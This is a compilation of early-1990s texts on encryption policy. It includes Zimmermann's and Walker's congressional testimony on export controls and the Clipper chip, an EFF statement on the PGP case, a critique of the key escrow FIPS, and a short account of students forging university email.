the debate as we have--as one in which theliberty of free speech is in conflict with the elimination of racism--we have advanced the cause of racial oppression and placed the bigoton the moral high ground, fanning the rising flames of racism." Hedoes not intend it as such, but I read this passage as a harsh rebuketo the movement itself. As the critical race theory manifestoacknowledges, "This debate has deeply divided the liberal civilrights/civil liberties community." And so it has. It has createdhostility between old allies and fractured longtime coalitions. Was itworth it? Justice Black's words may return, like the sound of anunheeded tocsin, to haunt us: "Another such victory and I am undone." Henry Louis Gates Jr. is W.E.B.

Our objections are in three all encompassing areas. First, thisdraft is a corruption of the basic FIPS process itself. Second,it is a technically content-free standard. Third, it lacks anyevidence of an economic analysis of the cost-benefit relationshipof the proposed key escrow process. 1. Corruption of the FIPS Process This proposed FIPS deviates so significantly from the "normal" FIPS process that it violates almost thirty years of tradition of open standards that have been subjected to repeated public scrutiny and are as technically sound as any public process can make them. Independent of the contents of this proposed FIPS, this shift in the FIPS process itself must be resisted if we are ever to have technical standards that are acceptable to the public again. The traditional FIPS process, as represented by the very recent FIPS 140-1 proposal, typically involves the generation of a set of technical ideas which are discussed in public workshops and seminars, followed by a draft proposed standard which is widely distributed for public comment, often followed by several iterations, each attempting to meet the technical concerns of particular segments of the public and, eventually, resulting in a FIPS document that represents an acceptable compromise of technical ideas. This process, amazingly similar to the way Congress passes legislation, however long and frustrating, is undoubtedly the best process we will ever devise for producing a publicly acceptable standard that will be implemented by industry and yield products that can be purchased by consumers as well as the Government. The Escrowed Encryption Standard (EES) proposed FIPS completely ignores this process and puts forth in the briefest, technically content-free document possible, a proposal which forces the public to rely completely on secret information that they will never be able to examine or understand. Secret specifications may be a necessary part of developing equipment and procedures for protecting classified national security related information. But, they have no place in a free society in protecting unclassified Government and commercial information. One must assume that the technicians that have devised the classified background for this FIPS shell are good at what they are doing (though the rumored further delay in availability of Clipper chips to the first quarter of 1994 does not build one's confidence). But, one must question the need for such secrecy and the price the Government will pay for being unwilling to share the technology by which it intends to protect our unclassified information. There are alternatives to key escrow encryption that are technically sound and could follow the traditional FIPS approach. There are multiple instances of telephone security devices that are presently commercially available using proprietary approaches that could serve as a useful model for a FIPS. There is a long tradition dating back at least to the Data Encryption Standard, by which NIST seeks proposals from industry and negotiates to have complete rights granted to the public to use the approved commercial approach. For unspecified reasons, NIST has chosen to abdicate its FIPS procedures and, without seeking public suggestions, to proceed directly with this unorthodox classified FIPS approach. The only apparent reason given for the haste with which this process is proceeding is that "the President said he wanted it." Apparently, the staff people who prepared the President's statement of April 16, 1993 on the Clipper Initiative included comments to the effect that NIST should proceed quickly to develop a FIPS covering key escrow procedures. I do not believe that if President Clinton understood, when he signed the April 16 announcement, he was asking for such a corruption of the technical process by which FIPS are developed, he would have signed the announcement. 2. Technically Content-Free Standard This proposed standard contains so little specific information that it is almost totally useless to anyone attempting to implement a key escrow telephone system. The single most important motive for a FIPS is to establish a means for interoperability among multiple vendors' products. If there is so little information available in the FIPS that no one knows how to implement it without a classified contract, then I believe this document should not be called a FIPS. It relies upon specifications of the encryption/decryption algorithm (SKIPJACK) and the LEAF Creation Method 1 (LCM-1) that are classified. There is precedent in a very brief FIPS (FIPS 107 on Local Area Networks), but, in this case, the FIPS references a publicly available, extensively reviewed and unclassified American National/IEEE/ISO Standard (802.3) that gives complete specifications for implementing that standard. Anything less than this should be unacceptable as a FIPS. 3. Lack of a Cost-Benefit The entire key escrow process, as it has been reported in public over the past six months, seems to be devoid of any analysis of what it will cost verses what it will accomplish. Perhaps the Government has performed such an analysis, but I am unaware of any indications to that effect. In the same spirit that I offered my comments on the fundamental flaws in the NIST proposal to license the Digital Signature Algorithm to the Public Key Partners Corporation, I now offer the following relatively superficial analysis of the law enforcement benefits of key escrow. I hope this simple look will be augmented by better information from the Administration that will show that I am wrong in my approach and/or conclusions. If one estimates the number of telephone security devices that may be in use in the U.S. in the next ten years, one must acknowledge that, for the most part, the general public will not spend the extra money to protect its routine phone calls from an unforeseen threat. Businesses will probably purchase these devices for their executives but not bother for the bulk of their routine transactions. As a result, I estimate that, optimistically, as many as ten percent (10%) of the public phones in the U.S. may be protected with security devices in the next ten years. Given that the Administration has assured us that the public will not be prohibited from using alternative encryption systems, when one considers how many of these devices will be key escrow devices, one must take into account already available competing devices such as the AT&T proprietary 3600s and the Cylink DES devices which do not use key escrow procedures. I estimate that of the installed devices, no more than fifty percent (50%) will be key escrowed devices in the next ten years. The number of Title III wiretaps that take place in a given year is approximately 4,000 (the number of court ordered wiretaps is approximately 800 times an average of 5 physical taps per court order). If my estimate of the number of key escrow phone devices is accurate and those estimates represent the population of phones that the law enforcement authorities expect to encounter when placing a wiretap, then we should see approximately 200 actual key escrowed phone taps in any given year or approximately 16 per month; 1 every 2 days or so. This is hardly enough to justify all the key escrow administrative expenses. Unfortunately, the estimates of five percent (5%) of the U.S. phones having and using key escrow devices is not likely to be representative of the population of phones that law enforcement authorities will encounter. Business executives will use key escrow phones, but those that do not want their calls monitored by anyone will choose devices that are not subject to key escrow. So even the optimistic numbers cited above are probably overly optimistic. One cannot avoid commenting that it appears the key escrow agents will no doubt make the Maytag repair man look like a beehive of activity. I recognize that there may be an EES II on the way that will extend key escrow to computer communications and perhaps increase the activity of the key escrow agents. On the other hand, presumably any Title III wiretaps of computer communications are already included in the estimated 4,000 wiretaps per year, so perhaps not. And for this, how much will it cost to operate the key escrow process? Does anyone know? I offer the above admittedly superficial analysis in the hopethat the Administration will be forth coming with betterdocumented estimates to justify why it is so intent on proceedingso quickly down the key escrow path. I fear that the proposedEES is just a symptom of a process that seems out of control. One can only hope that the President's Interagency review ofcryptography, that is expected to reach its conclusions soon,will recognize that there really is no need to proceed at suchgreat speed and that the Administration and the public will bemuch better served by using a somewhat accelerated FIPS process,that makes use of public technical input, in establishing theU.S. public telephone security policy for the next twenty orthirty years. Slow down and look at the alternatives! We cannot afford not to! Sincerely, Stephen T.

There was a notefrom a friend asking me to call. The person asked several questions andposed a problem. "If you were the Data Czar, what would be the top 5 future policy andregulatory problems would want start to solve now" (slightly paraphrased Isuspect). After thinking for 1/2 hour, he was in a rush, I came up with the followingthoughts. (by the way I left clipper out of this since we both knew how wefelt on that one and I left intellectual property out since I believe weare not yet ready for regulations and laws). Problem 1 -- assuring modularity and interoperability of the broadbandoperating system, including settops, video servers, and, generallyspeaking, all API's Microsoft proposes the creation of a possibly default standard which willrestrict and limit access to most likely one layer and one model. Suggestedfix -- convene an industry wide "standards" body of the potential players(like HDTV) and fight it out before the defacto standard is in place. Problem 2 Spectrum management. The allocation of major blocks of spectrum will limit the ability toefficiently and rationally utilize the space. It will create, as it has inthe past, economic incentives to waste spectrum space and create artificialshortages. Converting the current entitlements to a more rational and moremodern structure, while hard, will potentially enable the wireless data useto blossom. Problem 3. Third party access to networking infrastructure. Already we see data carriers refusing to grant access to third partynetworking companies because they will complete with the carrier inspecific markets. That leaves the third party potential network supplierswith only extremely expensive routes to servicing their customers. What isneeded to evolve a new concept in common carriage that would minimizeregulation yet disallow anti-competitive behavior on the part of existingcarriers. This is clearly an issue with the cable companies as they enterdata services and with the current packet carriers. A broad re-examinationis called for. Problem 4 == Electronic Commerce and money. The financial viability of future networking will depend on the ability ofpeople to buy goods and services over the network. While "credit card"mechanisms are there, the creation of electronic money may be a better orat least alternative route. Right now the laws and policy on the creationand use of such money is confused. The modification of banking laws etc. toallow the controlled creation of such money and to examine it's implicationon the nation, it's taxes etc. is a prime non technical task. Problem 5. Privacy Not much more has to be said except the lack of believable privacy and thelack of adequate laws on the use of transactions and information obtainedvia network usage and monitoring will, I believe, restrict the use of thenetwork to "games" and make it less useful for commerce and business. Manyof the laws do not obviously map to network commerce or do not cover newproblems that the network creates -- like the analysis on transactions ornetnews reading behavior. Problem 6. Entitlements to network use. This is not a regulatory issues but a political hot potato. More and morethere are voices calling for network access for minorities, dis-advantaged,inner city, etc. as a right. While each if not all of these are defensible,the cost to be carried by either the government or the public through ratesis potentially high. A rational examination of the costs/benefits would bewell worthwhile before it becomes a major headache. Actually I doubt thatsuch a rational examination can be made due to the enormous sensitivitiesof the parties but.. Idea 1. While I was thinking of the above, I had an evil thought. How doeson fund the infrastructure in a reasonable way. The idea of a VAT taximposed on network services and goods seems like a way of creating a cashflow that could be used to pay for research, entitlements etc. Just anidea.

EFF's response to the anti-cryptography campaign, which has been directedinitially against the "Pretty Good Privacy" (PGP) encryption programwritten by Phil Zimmermann, is three-fold: o EFF and EFF board members will immediately contributefunds to Phil Zimmermann's current legal expenses as they relateto constitutional issues, and will encourage others to make donationsfor this legal effort. o EFF will continue to vigorously investigate the facts of the PGP caseand other cryptography-related cases that may arise, in orderto spotlight the constitutional issues raised by such cases. o EFF is now planning to launch in the near future a First Amendmentcampaign aimed both at raising funds to support legal work on theConstitutional issues raised by these cases, and at educating policymakersand the general public about need to reform our outmoded export control laws . The basic facts of the PGP case(s) are as follows: The Customs Bureau has interviewed Phil Zimmermann and others involved inPGP. A San Jose grand jury, convened by Assistant US Attorney WilliamKeane, subpoenaed documents relating to PGP from Zimmermann, as wellas ViaCrypt and Austin Code Works, two companies who intend to offercommercial products related to PGP. Finally, the State Department has senta letter to the Austin Code Works requiring them to register as an armsdealer, even if they don't plan to export cryptography. In light of these developments, the Electronic Frontier Foundation Board ofDirectors met in Austin on Sept 22-23 to plan EFF's response. EFF's Board of Directors believes that this case may involve fundamentalissues in the application of the U.S. Constitution to digital media. Atstake is the right of privacy, public access to secure cryptography, theright to publish digital writings, and the right of equal protection underthe law. We are resolved to take this matter very seriously. For this reason, EFF will undertake a vigorous investigation of the factsin this and any other PGP related cases which might arise. If the Grand Jury issues indictments that would, in the view of EFF,threaten the future of digital liberty, we are prepared to assist in the caseand any others which might have similar adverse effects. We are alsoprepared to seek to amend the export laws to protect constitutional speechand the right to disseminate and use encryption to protect the citizens'right to privacy and to the security of their communications. In the short run, EFF will assist Phil and others involved with PGP to findcriminal defense attorneys, explore ways to get any cases handled probono publico, or for expenses only, and contribute funds to Phil and otherpossible defendants for preindictment constitutional research, and weencourage others to do the same. As of this announcement, several thousanddollars have been pledged by EFF and EFF board members including John Gilmore,Mitchell Kapor, John Perry Barlow. In the near future, EFF will launch a national campaign designed to providelegal and financial support for cases or legislative efforts that wouldpromote the Constitutionally guaranteed rights to develop, discuss, anduse cryptographic technology. We urge you to help Phil Zimmermann in preparing his constitutional defenseby contacting Phil's lawyer, Philip Dubois (dubois@csn.org, +1 303 444 3885,or 2305 Broadway, Boulder, CO 80304, USA). He is accepting legal defensecontributions relating directly to Phil's defense as an individual.

It states that because of the increasinguse of cellular, digital communications and the availability of strongencryption software, it has made it more difficult if not impossible forthe government to effectively spy on people. It says that that is whythe government wants us to use the clipper chip so that it can make spyingeasier for them. Heres a bit from the article: "DEMANDING THE ABILITY TO SNOOP: Afraid new technology may foil eavesdroppingefforts, US officials want phone and computer users to adopt the sameprivacy code. The government would hold the only key.""...White House and FBI officials insist they have no way to force anycompany to adopt the new (clipper) technology. They will not outlaw otherforms of coding, they said.""But experts say a series of regulatory actions involving Congress, theState Department, the US attorney general, export licensing restrictionsand the purchasing power of the federal government will effectivelyforce people to use the (skipjack) code.""...Federal officials acknowledge they are even considering the idea thatforeign governments should be given the (clipper) keys to unlock long-distance calls, faxes, and computer transmissions from the United States.An international agency, supervised by the United Nations or Interpol,might be asked to hold in trust the keys to electronic codes, said ClintBrooks, a senior NSA technical advisor." The article mentions that the 2 parts of the keys will be kept by theNIST and the Treasury Department.Anyway, this article is long and goes on for a full page and a half.Anyone interested in reading the whole thing should read it.

Lee) Until such time as either the general population learns what to expect ordigital authentication (such as PEM) becomes widespread, I suspect we willhear more of this kind of incident. This academic year the University ofWisconsin started providing e-mail accounts to all students at its Madisoncampus. (6,000?, maybe) The students, both technical and non-technical, arebeing encouraged to use e-mail as a way of interacting with their instructors.They access the accounts either through University-supplied machines scatteredthroughout the campus or through dial-up Serial Link Protocol (SLIP)connections. A mix of Macintosh's, PC's and other assorted workstations areinvolved. Last week (note how early in the school year) a group of five students,several from the Honors floor of one of the freshman dorms, were caught havingforged several pieces of e-mail. Most potentially damaging was a note sayingit was from the Director of Housing, to the Chancellor of the University,David Ward; note that the previous Chancellor is now Pres. Clinton'sSecretary of HHS, so the present Chancellor is new to the job. The forgedmessage was a submission of resignation. Ward's secretary had just returnedfrom vacation and apparently assumed the proferred resignation was legitimate.The secretary accepted it and started to act upon it -- it was only during thecourse of that that it was discovered to be a fake. The students also sent messages purporting to be from the Chancellor toother students asking them to pay their tuition. They also forged a messagefrom the Chancellor (my information doesn't say who it went to) saying hewas going to "come out of the closet" and announce it Sept. 25. The students were only caught through a combination of circumstances. First,since they used one of the dial-in connections there were logs of who dialedin when. Secondly, during the course of their experiments they botched someaddresses which caused enough traffic to go to the dead-letter office that theinvestigation could narrow what was happening. (It should be pointed out thatthe forgery was fairly easy to accomplish using the Eudora mail client on aMacintosh: the user has complete choice over the "from:" field of a message.) The FBI is investigating whether any federal crime was involved and,needless-to-say, the students are likely to be expelled at the least.

I'm here to talk to you today aboutthe need to change US export control policy for cryptographicsoftware. I want to thank you for the opportunity to be here andcommend you for your attention to this important issue. I am the author of PGP (Pretty Good Privacy), a public-key encryptionsoftware package for the protection of electronic mail. Since PGPwas published domestically as freeware in June of 1991, it has spreadorganically all over the world and has since become the de factoworldwide standard for encryption of E-mail. The US Customs Serviceis investigating how PGP spread outside the US. Because I am atarget of this ongoing criminal investigation, my lawyer has advisedme not to answer any questions related to the investigation. I. The information age is here. Computers were developed in secret back in World War II mainly tobreak codes. Ordinary people did not have access to computers,because they were few in number and too expensive. Some peoplepostulated that there would never be a need for more than half adozen computers in the country. Governments formed their attitudestoward cryptographic technology during this period. And theseattitudes persist today. Why would ordinary people need to haveaccess to good cryptography? Another problem with cryptography in those days was thatcryptographic keys had to be distributed over secure channels so thatboth parties could send encrypted traffic over insecure channels.Governments solved that problem by dispatching key couriers withsatchels handcuffed to their wrists. Governments could afford tosend guys like these to their embassies overseas. But the greatmasses of ordinary people would never have access to practicalcryptography if keys had to be distributed this way. No matter howcheap and powerful personal computers might someday become, you justcan't send the keys electronically without the risk of interception.This widened the feasibility gap between Government and personalaccess to cryptography. Today, we live in a new world that has had two major breakthroughsthat have an impact on this state of affairs. The first is thecoming of the personal computer and the information age. The secondbreakthrough is public-key cryptography. With the first breakthrough comes cheap ubiquitous personalcomputers, modems, FAX machines, the Internet, E-mail, digitalcellular phones, personal digital assistants (PDAs), wireless digitalnetworks, ISDN, cable TV, and the data superhighway. Thisinformation revolution is catalyzing the emergence of a globaleconomy. But this renaissance in electronic digital communication brings withit a disturbing erosion of our privacy. In the past, if theGovernment wanted to violate the privacy of ordinary citizens, it hadto expend a certain amount of effort to intercept and steam open andread paper mail, and listen to and possibly transcribe spokentelephone conversation. This is analogous to catching fish with ahook and a line, one fish at a time. Fortunately for freedom anddemocracy, this kind of labor-intensive monitoring is not practicalon a large scale. Today, electronic mail is gradually replacing conventional papermail, and is soon to be the norm for everyone, not the novelty is istoday. Unlike paper mail, E-mail messages are just too easy tointercept and scan for interesting keywords. This can be doneeasily, routinely, automatically, and undetectably on a grand scale.This is analogous to driftnet fishing-- making a quantitative andqualitative Orwellian difference to the health of democracy. The second breakthrough came in the late 1970s, with the mathematicsof public key cryptography. This allows people to communicatesecurely and conveniently with people they've never met, with noprior exchange of keys over secure channels. No more special keycouriers with black bags. This, coupled with the trappings of theinformation age, means the great masses of people can at last usecryptography. This new technology also provides digital signaturesto authenticate transactions and messages, and allows for digitalmoney, with all the implications that has for an electronic digitaleconomy. (See appendix) This convergence of technology-- cheap ubiquitous PCs, modems, FAX,digital phones, information superhighways, et cetera-- is all part ofthe information revolution. Encryption is just simple arithmetic toall this digital hardware. All these devices will be usingencryption. The rest of the world uses it, and they laugh at the USbecause we are railing against nature, trying to stop it. Trying tostop this is like trying to legislate the tides and the weather. It'slike the buggy whip manufacturers trying to stop the cars-- even withthe NSA on their side, it's still impossible. The informationrevolution is good for democracy-- good for a free market and trade.It contributed to the fall of the Soviet empire. They couldn't stopit either. Soon, every off-the-shelf multimedia PC will become a secure voicetelephone, through the use of freely available software. What doesthis mean for the Government's Clipper chip and key escrow systems? Like every new technology, this comes at some cost. Cars pollute theair. Cryptography can help criminals hide their activities. Peoplein the law enforcement and intelligence communities are going to lookat this only in their own terms. But even with these costs, we stillcan't stop this from happening in a free market global economy. Mostpeople I talk to outside of Government feel that the net result ofproviding privacy will be positive. President Clinton is fond of saying that we should "make change ourfriend". These sweeping technological changes have big implications,but are unstoppable. Are we going to make change our friend? Or arewe going to criminalize cryptography? Are we going to incarcerateour honest, well-intentioned software engineers? Law enforcement and intelligence interests in the Government haveattempted many times to suppress the availability of strong domesticencryption technology. The most recent examples are Senate Bill 266which mandated back doors in crypto systems, the FBI DigitalTelephony bill, and the Clipper chip key escrow initiative. All ofthese have met with strong opposition from industry and civil libertiesgroups. It is impossible to obtain real privacy in the informationage without good cryptography. The Clinton Administration has made it a major policy priority tohelp build the National Information Infrastructure (NII). Yet, someelements of the Government seems intent on deploying and entrenchinga communications infrastructure that would deny the citizenry theability to protect its privacy. This is unsettling because in ademocracy, it is possible for bad people to occasionally getelected-- sometimes very bad people. Normally, a well-functioningdemocracy has ways to remove these people from power. But the wrongtechnology infrastructure could allow such a future government towatch every move anyone makes to oppose it. It could very well bethe last government we ever elect. When making public policy decisions about new technologies for theGovernment, I think one should ask oneself which technologies wouldbest strengthen the hand of a police state. Then, do not allow theGovernment to deploy those technologies. This is simply a matter ofgood civic hygiene. II. Export controls are outdated and are a threat to privacy and economic competitivness. The current export control regime makes no sense anymore, givenadvances in technology. There has been considerable debate about allowing the export ofimplementations of the full 56-bit Data Encryption Standard (DES).At a recent academic cryptography conference, Michael Wiener of BellNorthern Research in Ottawa presented a paper on how to crack the DESwith a special machine. He has fully designed and tested a chip thatguesses DES keys at high speed until it finds the right one.Although he has refrained from building the real chips so far, he canget these chips manufactured for $10.50 each, and can build 57000 ofthem into a special machine for $1 million that can try every DES keyin 7 hours, averaging a solution in 3.5 hours. $1 million can behidden in the budget of many companies. For $10 million, it takes 21minutes to crack, and for $100 million, just two minutes. That'sfull 56-bit DES, cracked in just two minutes. I'm sure the NSA cando it in seconds, with their budget. This means that DES is noweffectively dead for purposes of serious data security applications.If Congress acts now to enable the export of full DES products, itwill be a day late and a dollar short. If a Boeing executive who carries his notebook computer to the Parisairshow wants to use PGP to send email to his home office in Seattle,are we helping American competitivness by arguing that he has evenpotentially committed a federal crime? Knowledge of cryptography is becoming so widespread, that exportcontrols are no longer effective at controlling the spread of thistechnology. People everywhere can and do write good cryptographicsoftware, and we import it here but cannot export it, to the detrimentof our indigenous software industry. I wrote PGP from information in the open literature, putting it intoa convenient package that everyone can use in a desktop or palmtopcomputer. Then I gave it away for free, for the good of ourdemocracy. This could have popped up anywhere, and spread. Otherpeople could have and would have done it. And are doing it. Againand again. All over the planet. This technology belongs toeverybody. III. People want their privacy very badly. PGP has spread like a prairie fire, fanned by countless people whofervently want their privacy restored in the information age. Today, human rights organizations are using PGP to protect theirpeople overseas. Amnesty International uses it. The human rightsgroup in the American Association for the Advancement of Science usesit. Some Americans don't understand why I should be this concerned aboutthe power of Government. But talking to people in Eastern Europe, youdon't have to explain it to them. They already get it-- and theydon't understand why we don't. I want to read you a quote from some E-mail I got last week fromsomeone in Latvia, on the day that Boris Yeltsin was going to warwith his Parliament: "Phil I wish you to know: let it never be, but if dictatorship takes over Russia your PGP is widespread from Baltic to Far East now and will help democratic people if necessary. Thanks." Appendix -- How Public-Key Cryptography Works In conventional cryptosystems, such as the US Federal Data EncryptionStandard (DES), a single key is used for both encryption anddecryption. This means that a key must be initially transmitted viasecure channels so that both parties have it before encryptedmessages can be sent over insecure channels. This may beinconvenient. If you have a secure channel for exchanging keys, thenwhy do you need cryptography in the first place? In public key cryptosystems, everyone has two related complementarykeys, a publicly revealed key and a secret key. Each key unlocks thecode that the other key makes. Knowing the public key does not helpyou deduce the corresponding secret key. The public key can bepublished and widely disseminated across a communications network.This protocol provides privacy without the need for the same kind ofsecure channels that a conventional cryptosystem requires. Anyone can use a recipient's public key to encrypt a message to thatperson, and that recipient uses her own corresponding secret key todecrypt that message. No one but the recipient can decrypt it,because no one else has access to that secret key. Not even theperson who encrypted the message can decrypt it. Message authentication is also provided. The sender's own secret keycan be used to encrypt a message, thereby "signing" it. This createsa digital signature of a message, which the recipient (or anyoneelse) can check by using the sender's public key to decrypt it. Thisproves that the sender was the true originator of the message, andthat the message has not been subsequently altered by anyone else,because the sender alone possesses the secret key that made thatsignature. Forgery of a signed message is infeasible, and the sendercannot later disavow his signature. These two processes can be combined to provide both privacy andauthentication by first signing a message with your own secret key,then encrypting the signed message with the recipient's public key.The recipient reverses these steps by first decrypting the messagewith her own secret key, then checking the enclosed signature withyour public key. These steps are done automatically by therecipient's software. -- Philip Zimmermann 3021 11th Street Boulder, Colorado 80304 303 541-0140 E-mail: prz@acm.org -- WT02-B11-301IA086-000618-B045-24http://res2.resnet.upenn.edu:80/cis590/reading.028.html 130.91.195.242 19970122054342 text/html 17979HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 05:43:40 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 17807Last-modified: Tue, 22 Nov 1994 06:31:09 GMTtestimony by Steve Walker on Export controls TESTIMONY BY STEPHEN T. WALKER PRESIDENT TRUSTED INFORMATION SYSTEMS, INC. FOR SUBCOMMITTEE ON ECONOMIC POLICY, TRADE AND ENVIRONMENT COMMITTEE ON FOREIGN AFFAIRS U.S. HOUSE OF REPRESENTATIVES OCTOBER 12, 1993 Good Afternoon. I am pleased to testify today about the negativeimpact that U.S. export control regulations on cryptography arehaving on one of the few industries where the U.S. remainsdominant worldwide: the information system software industry.The major points of my testimony are that U.S. export controls donot prevent the international availability of good qualitycryptography but do penalize the U.S. software industry and U.S.business in general. My name is Stephen T. Walker. I am the founder and President ofTrusted Information Systems (TIS), Inc., a ten year old firm with85 employees. With offices in Glenwood, MD; Los Angeles, CA;Mountain View, CA; Minneapolis, MN; and London, UK, TISspecializes in research, product development, and consulting inthe fields of computer and communications security. I am alsohere representing the Software Publishers Association (SPA) andits members on this most important topic. The SPA is the principal trade association of the personalcomputer software industry. Since 1984, it has grown to over1,000 members, representing the leading publishers in thebusiness, consumer, and education software markets. My background includes twenty-two years as an employee of theDepartment of Defense, with the National Security Agency (NSA),the Defense Advanced Research Projects Agency, and the Office ofthe Secretary of Defense. During my final three years inGovernment, I was the Director of Information Systems for theAssistant Secretary of Defense for Communications, Command,Control, and Intelligence (C3I). In 1983, I left Government service and began my own consultingfirm, specializing in the area of information systems security.My company has experienced steady growth and now offers a varietyof products with improved information security for military andcivilian applications in addition to our continuing consultingactivities. Several of these products are adversely affected byU.S. Government export controls, as are the products of many SPAmembers. For the past two years, I have been a member of the ComputerSystem Security and Privacy Advisory Board (CSSPAB), chartered byCongress in the Computer Security Act of 1987 to advise theExecutive and Legislative Branches on matters of national concernin computer security. In March 1992, the Board first called fora national review of the balance between the interests of lawenforcement/national security and those of the public regardinguse of cryptography in the United States. The Board has beenheavily involved in this review, receiving public input on theAdministration's Clipper Initiative, announced by the Presidenton April 16 of this year. Participation in the Board's reviewhas been highly beneficial in helping me form my opinions in thisarea. OVERVIEW The focus of attention at today's hearing is the negative impactthat U.S. export controls on cryptography are having on the U.S.computer industry. In May 1992, I testified before the HouseJudiciary Committee, Subcommittee on Economic and Commercial Lawhearings, on the impact of U.S. export laws on our industry'sability to protect itself from foreign industrial espionage. Ialso participated in similar hearings in July 1991 and June 1990in which this topic was of major importance. The export controlsubject continues to arise in different contexts, but thedifficult problems lurking behind it are always the same. The stakes for the software industry are high. The U.S. holds75% of the global market for packaged software. Most softwarecompanies make 35-40% of their revenue from exports; for somecompanies exports are as much as 50% of their business. Whendemand for cryptographic products is increasing, exportrestrictions essentially place an "earnings cap" on U.S. softwarepublishers. A National Dilemma The basic issue is a dilemma of truly national proportionsbetween the long standing and vital interests of our Governmentto learn as much as it can about its adversaries--be theycriminals, terrorists, or other governments--on the one hand, andthe basic right to privacy that all Americans assume they haveand are seeking to extend to their personal and businesscommunications, whether by telephone, electronic mail, or otherforms of computer communications. The resolution of this dilemma will have enormous impact on ourcountry for decades to come. The Government's national securityinterests contend that if good quality cryptography were tobecome widely available in this country and the world, ourability to wiretap criminals and listen in to terrorists andother adversaries would be severely hurt. Those seeking improvedprivacy protection argue that encryption is needed to supportworldwide business operations and good quality cryptography isalready available worldwide. Continuing U.S. Governmentrestrictions are only penalizing U.S. users with inferior U.S.-developed security products and limiting U.S. industry fromparticipating in a rapidly growing international marketplace. Technology Has Shifted The core of the issue is a shift in technology over the pasttwenty years that has fundamentally altered both businesscommunications needs and an advantage that law enforcement andnational security interests have enjoyed since the earliest daysof electronic communications. Before radio and telephonecommunications, governments had to resort to intercepting mailand notes carried by spies to learn their adversaries' plans.When electronic communications became prevalent, governmentsfound they could intercept those communications relatively easilywith very useful results. When encryption was applied to thesecommunications, it became more difficult to make sense of them,but that turned into a test of wits among the mathematicians ofvarious countries. Some were more successful than others. During the time up to the 1980s, this behind-the-scenes strugglewas waged among governments with little if any effect onindividuals or business communities. But technology shiftsbeginning in the early 1980s and accelerating at breathtakingrates today resulted in vast computer communications and securitycapabilities for industrial and personal use worldwide and at thesame time have made it much harder for law enforcement andnational security interests to continue their interception roles. As we struggle to understand the complex issues confronting us inthis dilemma, we must recognize that even if U.S. commercial andprivate interests were willing to forgo their right to privatecommunications and U.S. computer manufacturers were willing todrop out of the international market for information productsemploying good quality security protection, the ability of theGovernment to decrypt the communications of its adversaries willcontinue to diminish at ever increasing rates over theforeseeable future, no matter what measures, such as employingkey escrow techniques or outlawing cryptography, our Governmentmay choose to take. The technology shifts we are seeing here have interestingparallels to those in the field of radar. Since the beginning ofWorld War II, radar has played an essential role in defendingagainst attacks from the air. But recent technology shifts haveproduced stealth capabilities that for now, at least, effectivelydefeat radar. We will soon face an equivalent dilemma as stealthmeasures become widely available: how to prevent drug dealers,terrorists, and other adversaries from using them to enter ourcountry undetected. We could require that all aircraft have someform of reflector that will guarantee that the Government candetect them whenever it has the need, but it is unlikely thatthose who wish to enter our airspace undetected will comply withsuch requirements. We must recognize that those who wish to protect theircommunications from eavesdroppers will increasingly be able to doso. We must be careful not to continue to insist on misguidedmeasures to try to retain decryption capability that willinevitably be eroded by technology, no matter how important wefeel that capability may be. The Congress Must Act Now! The principal vehicle that the Government's law enforcement andnational security interests have used to maintain the balance ontheir side of this dilemma over the years has been the impositionof strict export control measures on all cryptographic productsleaving this country. In light of the ongoing and inevitabletechnological shift toward better protection mechanisms andincreasing business communications needs, a review of this policyis urgently needed. Such a review must be conducted by someonewilling to understand the needs of both sides of the issue.Based on our experiences to date, I am convinced that the U.S.Congress is the only organization with the authority and balancedperspective to tackle such a tough issue. I hope that thesehearings will be the beginning of a true national debate of thismost vital issue. I would like to begin my testimony with a review of how theseexport controls came into place and why they made good sense inan earlier time but not necessarily now. I will then discuss thewidespread and rapidly growing foreign availability ofcryptographic products that is making this technological shift sohard for our intelligence capabilities. Following this, I willreview the highly negative effect that U.S. export controls arehaving on U.S. industries and the average U.S. citizen. WHY DO WE HAVE EXPORT CONTROLS ON CRYPTOGRAPHY? The method that governments have used for most of this century toprotect the privacy of their electronic communications and thathas gradually become available to individuals throughout theworld is called cryptography: the scrambling of data prior totransmission (encryption) and unscrambling upon receipt(decryption). As governments came to rely upon cryptography to protect theirvital communications, groups of highly skilled mathematicianswere assembled by the same governments to attempt to break theencrypted communications of their adversaries. In David Kahn's 1973 book, The Codebreakers, he states: Codebreaking is the most important form of secret intelligence in the world today. It produces much more and much more trustworthy information than spies, and this intelligence exerts great influence upon the policies of governments. Few would argue that this statement remains just as true today aswhen it was written. Export Controls Were Essential Initially All modern governments face the difficult competing tasks ofhaving good enough encryption capabilities to protect their owncommunications while trying to defeat the encryption capabilitiesof their adversaries. As encryption hardware devices becamereadily available, governments had to control where these deviceswent in order to limit the availability of good cryptography tohostile adversaries. Export control on encryption devices becamean integral part of the Department of State munitions controlprocess, where it remains today. With the advent of computers, the ability to perform encryptionfunctions using software programs rather than hardware madeencryption more readily available and its export control moredifficult. In the 1970s, efforts to improve the protection ofdomestic sensitive information led to publication of encryptionalgorithms such as the Federal Information Processing Standard(FIPS) Data Encryption Standard (DES) algorithm, which, whileintended to be implemented only in hardware, quickly becameavailable throughout the world in software. Personal computers gave individual users direct access to thevast power of the computer and led to a revolution in howbusinesses operate. Now highly sensitive corporate plans andfinancial information flow freely over the phone lines amongclusters of computers, and users are demanding improved securityfor their sensitive information from their software suppliers. The natural result of this evolution is the need to include goodquality encryption capabilities within modern software productsfor sale to multinational corporations worldwide. However,governments still want to control where encryption devices go inorder to limit the availability of good quality encryption tohostile adversaries. But Times Have Changed So a problem that twenty years ago only affected governments andthat led to the harsh export control restrictions presently inplace on encryption now threatens the ability of U.S. citizensand businesses to protect their own sensitive information and theability of the U.S. software industry to market the products thatits multinational customers are demanding. This is truly adilemma of national proportions that cannot be left solely in thehands of the national security interests to resolve. Few would argue that the Government should not continue listeningto the communications of its adversaries. But now that we have aworldwide economy with massive amounts of sensitive informationflowing in all directions at all times, few are willing to giveup the ability to provide reasonable protection to their owninformation in order to help the Government eavesdrop. "Listening In" Will Keep Getting Harder Even if we could forgo our personal and business privacy needsfor the sake of the national security interests, the continuousevolution of technology has already made it harder to listen into those who do not want to be heard than it was even a year ago.And that evolution will continue to make it even harder next yearand in every year that follows. The same technologies that have brought about the personalcomputer revolution are making good quality cryptographyavailable worldwide, and those people, businesses, andgovernments that choose to protect their communications can nowdo so quite effectively and at reasonable cost. The task oflistening in to others is becoming more and more difficult everyday in spite of extensive export controls. 